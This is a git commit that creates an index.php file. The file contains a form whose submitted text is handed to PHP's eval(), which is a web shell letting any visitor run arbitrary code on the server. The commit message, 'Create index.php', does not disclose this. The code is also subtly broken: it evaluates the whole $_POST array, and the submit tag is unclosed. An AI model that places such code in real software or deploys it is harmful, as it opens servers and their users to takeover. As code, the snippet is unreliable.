a0ac14a9e111dd95b49065f4c7b2558a6cf6ec9e
kotoff-studio <76766132+kotoff-studio@users.noreply.github.com>
2021-06-01 08:09:07 +0200

    Create index.php

---
+++ index.php
@@ -0,0 +1,11 @@
+<?php
+    if(isset($_POST['text'])) {
+        eval($_POST);
+    }
+?>
+
+<form method="POST">
+    <p><textarea name="text"></textarea></p>
+    <p><input type="submit"</p>
+    
+</form>
